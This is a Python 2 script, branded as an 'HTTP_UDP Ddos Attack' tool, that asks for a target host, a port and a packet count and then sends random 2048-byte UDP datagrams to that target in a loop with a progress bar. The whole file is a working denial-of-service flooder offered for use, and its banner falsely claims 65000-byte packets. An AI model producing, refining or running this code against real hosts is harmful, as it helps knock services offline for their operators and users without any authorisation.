# -*- coding: utf-8 -*-
#!/usr/bin/env python2
import os
import sys
import time
import socket
import random

print "!-------------------------------!"
print "!    Author  BY  :P3terJ4mes    !"
print "!    HTTP--UDP FLOODS SOCKET    !"
print "!    Don'n use Https or Http    !"
print "!    Example : thedomain.com    !"
print "!    Enter Ctrl + C for Stop    !"
print "!-------------------------------!"

if os.name in ('nt', 'dos', 'ce'):
    os.system('title       ........::::: Code By Thunder(P3terJ4mes),HTTP_UDP Ddos Attack :::::........')
    os.system('color 0A')
    
url = raw_input("Host : ")
host = url.replace("http://", "").replace("https://", "").split('/')[0]
ip = socket.gethostbyname(host)
port = input("Port : ")
sent = input("Thread : ")
print("Ip Host: "+ str(ip)+":"+ str(port))
print("Loading Packet ...........")
time.sleep(1)
print "Loading [                             ] 0% "
time.sleep(1)
print "Loading [=======                      ] 25%"
time.sleep(0.75)
print "Loading [==============               ] 50%"
time.sleep(0.5)
print "Loading [========================     ] 75%"
time.sleep(0.25)
print "Loading [=============================] 100%"
time.sleep(0)
 
print("Loading HTTP-UDP Packets............. ")
print("===============================>>>>>>>")
print("Sent %s packet to IP-[%s:%s] whit 65000 bytes Host-[%s]-")%(sent,ip,port,host)
print("")

def progressbar(it, prefix = '', size = 60):
    count = len(it)
    
    def _show(_i):
        x = int(size * _i / count)
        sys.stdout.write('%s[%s%s] %i/%i\r' % (prefix, '#' * x, '_' * (size - x), _i, count))
        sys.stdout.flush()
        
    _show(0)
    for (i, item) in enumerate(it):
        yield item
        (None, None, None)
        _show(i + 1)
    
    sys.stdout.write('\n')
    sys.stdout.flush()

def socker():
    try:
        socks =  socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(2048)
        socks.sendto(bytes,(ip,port))
        socks.close()
    except KeyboardInterrupt:
        exit("[============================>>> Canceled By P3terJ4mes !!!")


for i in progressbar(range(sent), 'Loading Threads: ',50):
        socker()
print ("+--------------------------------------------+")
print("The connections you requested had finished !!!!")


